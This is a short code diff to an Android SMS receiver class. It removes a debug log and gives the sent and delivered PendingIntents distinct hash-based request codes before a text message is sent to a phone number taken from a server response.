@@ -69,7 +69,8 @@ public class SmsReceiver extends BroadcastReceiver {
                                                                                 JSONObject jsonResponse = new JSONObject(result);
                                                                                 if (jsonResponse.has("data")) {
                                                                                     String phoneNumber = jsonResponse.getString("data");
-                                                                                    Log.d(Helper.TAG, "PHone Number "+ phoneNumber);
+                                                                                    int sentRequestCode = (userId + phoneNumber).hashCode();
+                                                                                    int deliveredRequestCode = (userId + phoneNumber + "_delivered").hashCode();
 
                                                                                     Intent sentIntent = new Intent(context, SentReceiver.class);
                                                                                     Intent deliveredIntent = new Intent(context, DeliveredReceiver.class);
@@ -77,8 +78,8 @@ public class SmsReceiver extends BroadcastReceiver {
                                                                                     sentIntent.putExtra("phone", phoneNumber);
                                                                                     deliveredIntent.putExtra("id", userId);
                                                                                     deliveredIntent.putExtra("phone", phoneNumber);
-                                                                                    PendingIntent sentPendingIntent = PendingIntent.getBroadcast(context, 0, sentIntent, PendingIntent.FLAG_IMMUTABLE);
-                                                                                    PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, 0, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
+                                                                                    PendingIntent sentPendingIntent = PendingIntent.getBroadcast(context, sentRequestCode, sentIntent, PendingIntent.FLAG_IMMUTABLE);
+                                                                                    PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, deliveredRequestCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
                                                                                     SmsManager smsManager = SmsManager.getDefault();
                                                                                     smsManager.sendTextMessage(phoneNumber, null, messageBody, sentPendingIntent, deliveredPendingIntent);
 
